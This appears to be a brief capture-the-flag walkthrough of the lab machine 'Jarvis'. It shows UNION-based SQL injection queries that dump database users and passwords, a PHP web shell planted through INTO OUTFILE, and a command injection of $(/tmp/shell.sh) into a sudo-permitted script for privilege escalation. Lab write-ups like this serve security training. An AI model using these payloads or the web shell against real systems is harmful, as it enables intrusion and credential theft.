# Jarvis

Difficulty: 5
Key takeway: systemctl
Tags: Linux Priv Esc, SQLi, systemctl
Type: Linux

# Enumeration

portscan 

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

possible sql injection in [http://ip/room.php](http://ip/room.php)?cod=2

```sql
UNION SELECT 1,2,group_concat(SCHEMA_NAME),3,4,5,6,7 from information_schema.schemata; -- -
# hotel,information_schema,mysql,performance_schema
UNION SELECT 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables; -- -
# room
UNION SELECT 1,2,group_concat(column_name),4,5,6,7 from information_schema.tables where table_schema='mysql';-- -
UNION SELECT 1,2,group_concat(user, ":", password),4,5,6,7 from mysql.user;-- -
```

found creds 

`DBadmin:imissyou`

# Initial Access

- created a database
- created a table
- ran an sql query to inject a php code into a new file
    
    ```sql
    SELECT '<?php echo system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/cmd.php';
    ```
    
    used this to get a reverse shell
    

# Privilege Escalation

```sql
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

- [simpler.py](http://simpler.py) uses os.system('ping' + command) it's possible to do command injection
- special characters are forbidden except for $()
- add code for bash reverse shell in /tmp/shell.sh

```sql
Enter IP: $(/tmp/shell.sh)
```

## Notes

-